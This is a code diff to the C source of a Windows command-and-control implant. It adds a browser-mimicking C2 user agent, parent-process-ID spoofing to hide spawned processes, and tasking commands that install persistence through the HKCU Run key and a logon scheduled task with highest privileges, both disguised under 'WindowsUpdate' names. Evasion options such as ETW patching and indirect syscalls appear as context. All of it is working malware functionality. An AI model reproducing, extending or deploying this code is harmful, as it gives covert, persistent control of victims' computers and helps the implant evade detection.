@@ -29,6 +29,12 @@
 #ifndef USE_MTLS
 #define USE_MTLS 0
 #endif
+#ifndef C2_USER_AGENT
+#define C2_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+#endif
+#ifndef C2_URI
+#define C2_URI "/api/submit"
+#endif
 
 /* ── Evasion options (toggled by builder via -D flags) ─── */
 #ifndef ENABLE_ETW_PATCH
@@ -250,6 +256,12 @@ static int exec_cmd(const char *cmd, char *out_b64, size_t out_b64_len) {
     }
 #endif
 
+#if ENABLE_PPID_SPOOF
+    if (g_ppid_spoof && !created) {
+        created = create_process_ppid_spoof(cmdline, hWrite, hWrite, &pi);
+    }
+#endif
+
 #if ENABLE_BLOCK_DLLS
     if (g_block_dlls && !created) {
         created = create_process_block_dlls(cmdline, hWrite, hWrite, &pi);
@@ -295,7 +307,8 @@ static int http_post(const char *host, int port, int use_https, const char *path
 {
     resp[0] = '\0';
     WCHAR whost[256]; ascii_to_wide(host, whost, 256);
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    WCHAR ua_wide[512]; ascii_to_wide(C2_USER_AGENT, ua_wide, 512);
+    HINTERNET hSession = WinHttpOpen(ua_wide, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return -1;
     HINTERNET hConn = WinHttpConnect(hSession, whost, (INTERNET_PORT)port, 0);
     if (!hConn) { WinHttpCloseHandle(hSession); return -1; }
@@ -732,7 +745,7 @@ static DWORD WINAPI agent_loop(LPVOID unused) {
         memset(g_ecdh_pub, 0, sizeof(g_ecdh_pub));
     }
 
-    const char *path = "/";
+    const char *path = C2_URI;
 
     /* ── Evasion at startup ── */
 #if ENABLE_INDIRECT_SYSCALL
@@ -932,6 +945,125 @@ static DWORD WINAPI agent_loop(LPVOID unused) {
 #else
                 b64_encode((unsigned char*)"ArgSpoof not compiled in", 24, out_b64);
 #endif
+            } else if (strcmp(tasks[t].command, "ppidspoof") == 0) {
+#if ENABLE_PPID_SPOOF
+                if (args_decoded[0] == '1' || (args_decoded[0] == 'o' && args_decoded[1] == 'n')) {
+                    g_ppid_spoof = 1;
+                    b64_encode((unsigned char*)"PPID spoofing enabled", 21, out_b64);
+                } else {
+                    g_ppid_spoof = 0;
+                    b64_encode((unsigned char*)"PPID spoofing disabled", 22, out_b64);
+                }
+#else
+                b64_encode((unsigned char*)"PPID spoof not compiled in", 26, out_b64);
+#endif
+            } else if (strcmp(tasks[t].command, "persist_registry") == 0) {
+                char val_name[256] = "WindowsUpdate";
+                char exe_path[MAX_PATH] = "";
+
+                if (args_decoded[0]) {
+                    char *sp = strchr(args_decoded, ' ');
+                    if (sp) {
+                        size_t nlen = (size_t)(sp - args_decoded);
+                        if (nlen >= sizeof(val_name)) nlen = sizeof(val_name) - 1;
+                        memcpy(val_name, args_decoded, nlen);
+                        val_name[nlen] = '\0';
+                        strncpy(exe_path, sp + 1, MAX_PATH - 1);
+                    } else {
+                        strncpy(val_name, args_decoded, sizeof(val_name) - 1);
+                        GetModuleFileNameA(NULL, exe_path, MAX_PATH);
+                    }
+                } else {
+                    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
+                }
+
+                HKEY hKey;
+                LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    0, KEY_SET_VALUE, &hKey);
+                if (res == ERROR_SUCCESS) {
+                    res = RegSetValueExA(hKey, val_name, 0, REG_SZ,
+                        (BYTE*)exe_path, (DWORD)(strlen(exe_path) + 1));
+                    RegCloseKey(hKey);
+                    if (res == ERROR_SUCCESS) {
+                        char msg[512];
+                        snprintf(msg, sizeof(msg),
+                            "Registry persistence added: HKCU\\...\\Run\\%s -> %s",
+                            val_name, exe_path);
+                        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
+                    } else {
+                        b64_encode((unsigned char*)"Failed to set registry value", 28, out_b64);
+                        success = 0;
+                    }
+                } else {
+                    b64_encode((unsigned char*)"Failed to open Run key", 22, out_b64);
+                    success = 0;
+                }
+            } else if (strcmp(tasks[t].command, "persist_schtask") == 0) {
+                char task_name[256] = "WindowsUpdateTask";
+                char exe_path[MAX_PATH] = "";
+
+                if (args_decoded[0]) {
+                    char *sp = strchr(args_decoded, ' ');
+                    if (sp) {
+                        size_t nlen = (size_t)(sp - args_decoded);
+                        if (nlen >= sizeof(task_name)) nlen = sizeof(task_name) - 1;
+                        memcpy(task_name, args_decoded, nlen);
+                        task_name[nlen] = '\0';
+                        strncpy(exe_path, sp + 1, MAX_PATH - 1);
+                    } else {
+                        strncpy(task_name, args_decoded, sizeof(task_name) - 1);
+                        GetModuleFileNameA(NULL, exe_path, MAX_PATH);
+                    }
+                } else {
+                    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
+                }
+
+                char schtask_cmd[2048];
+                snprintf(schtask_cmd, sizeof(schtask_cmd),
+                    "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /rl highest /f",
+                    task_name, exe_path);
+
+                if (exec_cmd(schtask_cmd, out_b64, sizeof(out_b64)) != 0) {
+                    b64_encode((unsigned char*)"Failed to create scheduled task", 31, out_b64);
+                    success = 0;
+                }
+            } else if (strcmp(tasks[t].command, "persist_remove") == 0) {
+                if (strncmp(args_decoded, "registry ", 9) == 0) {
+                    char *val_name = args_decoded + 9;
+                    HKEY hKey;
+                    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,
+                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                        0, KEY_SET_VALUE, &hKey);
+                    if (res == ERROR_SUCCESS) {
+                        res = RegDeleteValueA(hKey, val_name);
+                        RegCloseKey(hKey);
+                        if (res == ERROR_SUCCESS) {
+                            char msg[256];
+                            snprintf(msg, sizeof(msg),
+                                "Removed registry persistence: %s", val_name);
+                            b64_encode((unsigned char*)msg, strlen(msg), out_b64);
+                        } else {
+                            b64_encode((unsigned char*)"Value not found", 15, out_b64);
+                            success = 0;
+                        }
+                    } else {
+                        b64_encode((unsigned char*)"Failed to open Run key", 22, out_b64);
+                        success = 0;
+                    }
+                } else if (strncmp(args_decoded, "schtask ", 8) == 0) {
+                    char *task_name = args_decoded + 8;
+                    char cmd[1024];
+                    snprintf(cmd, sizeof(cmd),
+                        "schtasks /delete /tn \"%s\" /f", task_name);
+                    if (exec_cmd(cmd, out_b64, sizeof(out_b64)) != 0) {
+                        b64_encode((unsigned char*)"Failed to remove task", 21, out_b64);
+                        success = 0;
+                    }
+                } else {
+                    b64_encode((unsigned char*)"Usage: persist_remove registry <name> | schtask <name>", 54, out_b64);
+                    success = 0;
+                }
             } else if (strcmp(tasks[t].command, "exit") == 0) {
                 b64_encode((unsigned char*)"Agent exiting", 13, out_b64);
                 should_exit = 1;
